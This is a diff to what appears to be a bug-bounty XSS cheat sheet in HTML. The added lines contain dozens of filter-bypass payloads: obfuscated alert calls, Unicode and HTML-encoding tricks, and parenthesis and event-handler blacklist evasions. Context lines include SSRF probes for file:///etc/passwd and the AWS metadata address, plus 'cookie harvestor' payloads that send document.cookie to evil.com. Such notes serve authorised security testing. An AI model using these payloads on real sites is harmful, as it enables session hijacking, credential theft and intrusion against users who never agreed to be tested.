@@ -14,7 +14,20 @@ Never submit a vulnerability with alert(1) show impact, use document.cookie and 
 <h2>Alert POC Alternatives</h2>
 If alert is blocked or filtered, first try confirm(1), print() or prompt(1).<br>
 Try URL Encoding the A on alert - %61lert(1). URL each char if this does not work using referemce - https://www.w3schools.com/tags/ref_urlencode.ASP <br>
-Try [%27al\x65rt%27](document.domain);//
+Try [%27al\x65rt%27](document.domain);// <br>
+window['alert'](0)  <br>
+parent['alert'](1)  <br>
+self['alert'](2)  <br>
+top['alert'](3)  <br>
+this['alert'](4)  <br>
+frames['alert'](5)  <br>
+content['alert'](6)  <br>
+constructor.constructor("aler"+"t(3)")(); <br>
+[].filter.constructor('ale'+'rt(4)')(); <br>
+ top["al"+"ert"](5); <br>
+top[8680439..toString(30)](7); <br>
+top[/al/.source+/ert/.source](8); <br>
+top['al\x65rt'](9); <br>
 You dont need a popup for a POC, you can go straight to a cookie stealer POC. <br>
 <br>
 <h2>Identify what is being blocked</h2>
@@ -43,10 +56,18 @@ Try double encoding a newline break %2522 <br>
 New Line breaks often work on <.a/href=%2522javascript:alert(1)> <br>
 Injecting anchor tag without whitespaces -breaking up characters with decoded value of %26Tab%3B (url decode character) between each character<br>
  Try bypassing spaces with a bullet if / does not work - <code><.svg•onload=alert(1)> </code><br>
+ <br>
+ <h3> Encoding </h3>
  Try URL encoding on the payload <br>
  Try double URL encoding and see if this gets decoded <br>
  Try Unicoding normization - https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html - select a character and see if the ASCII value is reflected <br>
- Try normal unicode  - https://www.branah.com/unicode-converter
+ Try normal unicode  - https://www.branah.com/unicode-converter <br>
+ Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was transformed into U+003C LESS­THAN SIGN (<)<br>
+Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (")<br>
+Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (') <br>
+E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/ <br>
+%EF%BC%9E becomes > <br>
+%EF%BC%9C becomes < <br>
  <br>
  <h3> File Upload XSS </h3><br>
  If you find a file upload feature, try naming the file to an xss payload. Use burp intercept to rename files <br>
@@ -90,13 +111,45 @@ Can also use the below to get rid of the word JavaScript all together<br>
 </p>
 <br>
 <br>
-<h3>XSS when payload is reflected capitalized</h3> <br>
-<.IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1).><br>
+<h3>XSS polygots</h3> <br>
+https://twitter.com/s0md3v/status/966175714302144514 <br>
 <br>
+ <h3> Bypass " on the alert </h3><br>
+ String.fromCharCode(88,83,83) - alert(String.fromCharCode(88,83,83))
 <h3> SSRF Esculation </h3> <br>
 If you can get XSS within a pdf generator, try get ssrf via an iframe src=http://host or iframe src=file:///etc/passwd <br>
 Try with AWS 169.254.169.254 address if AWS <br>
 <br>
+ <h3> Bypass dot filter </h3> <br>
+ Use base64 encoding - alert(document.cookie)" | base64 == YWxlcnQoZG9jdW1lbnQuY29va2llKQ== <br>
+ <br>
+ <h3> Bypass parenthesis </h3> <br>
+ onerror=alert;throw 1337 <br>
+ {onerror=alert}throw 1337 <br>
+ throw onerror=alert,'some string',123,'haha' <br>
+ <br>
+ <h3> Bypass onxxxx blacklist </h3><br>
+ // Bypass onxxx= filter with a null byte/vertical tab <br>
+ onerror\x00=alert(0)<br>
+ onerror\x0b=alert(0)<br>
+ <br>
+ <h3> Bypass email check </h3> <br>
+ ".><.svg/onload=confirm(1)>"@x.y <br>
+ <br>
+ <h3> Different ways to issue redirect </h3> <br>
+ location="http://google.com" <br>
+document.location = "http://google.com" <br>
+document.location.href="http://google.com" <br>
+window.location.assign("http://google.com") <br>
+window['location']['href']="http://google.com" <br>
+ <br>
+ <h3> Dont Need to close your tags to bypass "> + > </h3>
+ <br>
+ <br>
+ <h3> Bypass using HTML Encoding <h3> <br>
+ %26%2397;lert(1) <br>
+&#97;&#108;&#101;&#114;&#116; <br>
+.><./script><.svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain).> <br>
 <h3> Cookie harvestor </h3><br>
 <.img/src/onerror=document.location="http://evil.com:8090/cookiez.php?c="+document.cookie><br>
 <.script>new Image().src="http://evil.com:8090/b.php?"+document.cookie;<./script>
